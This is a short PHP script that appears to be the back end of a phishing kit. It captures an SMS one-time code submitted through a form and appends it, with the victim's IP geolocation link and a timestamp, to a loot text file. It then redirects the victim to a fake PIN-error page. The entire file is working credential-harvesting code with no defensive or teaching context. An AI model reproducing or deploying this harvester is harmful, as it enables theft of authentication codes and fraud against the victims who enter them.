<?php

header("Location:wdpinorror.html");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________1MILYARD__________________.txt";
$code   = $_POST['code'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=============BISMILLAHAJADULU============");
fwrite($handle, "\n");
fwrite($handle, "SMS : ");
fwrite($handle, "$code");
fwrite($handle, "\n");
fwrite($handle, "http://www.geoiptool.com/?IP=$ip");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "=============BISMILLAHAJADULU============");
fwrite($handle, "\n");
fclose($handle);

?>
